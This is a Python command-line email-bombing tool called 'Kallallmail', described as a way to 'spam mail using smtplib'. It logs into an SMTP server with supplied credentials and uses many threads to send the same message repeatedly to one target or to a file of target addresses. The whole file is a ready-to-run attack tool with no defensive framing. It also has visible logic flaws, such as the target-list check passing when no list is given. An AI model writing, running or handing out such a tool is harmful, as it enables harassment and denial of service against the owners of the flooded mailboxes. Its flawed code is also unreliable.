#!/usr/bin/python3
# Kallallmail
# Author: Nuxber
# Date: 26/10/2022

# Use ./kallallmail.py 

import argparse
import threading
import smtplib
import sys
import os
from colorama import Fore, Style

def logo():
    print(Fore.RED + """"
 **                **  **            **  **                       **  **
/**               /** /**           /** /**                      //  /**
/**  **  ******   /** /**  ******   /** /** **********   ******   ** /**
/** **  //////**  /** /** //////**  /** /**//**//**//** //////** /** /**
/****    *******  /** /**  *******  /** /** /** /** /**  ******* /** /**
/**/**  **////**  /** /** **////**  /** /** /** /** /** **////** /** /**
/**//**//******** *** ***//******** *** *** *** /** /**//********/** ***
//  //  //////// /// ///  //////// /// /// ///  //  //  //////// // /// \n\n""" + Style.RESET_ALL)

parser = argparse.ArgumentParser(description="Spam mail using smtplib")

parser.add_argument('-m', '--email',
                    help='Provide your email: email, password',
                    type=str,
                    nargs=2,
                    required=True
                    )

parser.add_argument('-s', '--server',
                    help="Provide SMTP server.",
                    type=str,
                    required=True
                    )


parser.add_argument('-t', '--target',
                    dest="target",
                    help="Provide target.",
                    type=str,
                    )

parser.add_argument('-tl', '--tlist',
                    dest="tlist",
                    help="Provide a document with list targets",
                    type=str)

parser.add_argument('-a', '--amount',
                    dest="amount",
                    help="Amount of mails",
                    type=int,
                    default=1
                    )

parser.add_argument('-p', '--port',
                    dest="port",
                    help="Port",
                    type=int,
                    default=587)

args = parser.parse_args()

password = args.email[1]
email = args.email[0]
server = args.server
amount = args.amount
target = args.target
tlist = args.tlist
port = args.port

if target == None and tlist == None:
    print(Fore.RED + "ERROR: No target." + Style.RESET_ALL, file=sys.stderr)
    sys.exit(1)

if tlist != None:
    if os.path.exists(tlist) == False:
        print(Fore.RED + "Error: File does not exists" + Style.RESET_ALL, file=sys.stderr)
        sys.exit(1)

logo()

subject = input("Write the subject: ")
print("Write the message when you finish use ^D")

message = ""
for line in sys.stdin:
    message += line

class Email_Bomber:
    def __init__(self, mail, server, port, password, target, tlist, threads, amount, message, subject):
        self.mail = mail
        self.server = server
        self.password = password
        self.target = target
        self.tlist = tlist
        self.threads = threads
        self.amount = amount
        self.port = port
        self.message = f"From: <{mail}>\nTo: <{target}>\nSubject: {subject}\n"
        self.message += message
    
    def send(self, mail, server, port, password, target, message):
        try:
            server = smtplib.SMTP(server, port)
            server.ehlo()
            server.starttls()
            server.login(mail, password)
            server.sendmail(mail, target, message)
            server.quit()
            print(Fore.GREEN + "SUCCESS: %s was able to successfully send mail to %s" % (mail, target) + Style.RESET_ALL)
        except:
            print(Fore.RED + "ERROR: %s cannot send mail to %s" % (mail, target) + Style.RESET_ALL)

    def read_file(self):
        f = open(self.tlist)
        targets = []

        for i in f.readlines():
            i = i[:-1]
            targets.append(i)

        return targets

    def attack(self):
        if self.tlist != False: 
            targets = self.read_file()
        else: 
            target = self.target; targets = [target]

        for target in targets:
            i = 0
            while i < self.amount:
                i += 1
                thread = threading.Thread(
                    name="attack",
                    target=self.send,
                    args=(self.mail, self.server, self.port, self.password, target, self.message)
                )
                thread.start()


attack = Email_Bomber(email, server, port, password, target, tlist, 30, amount, message, subject)
attack.attack()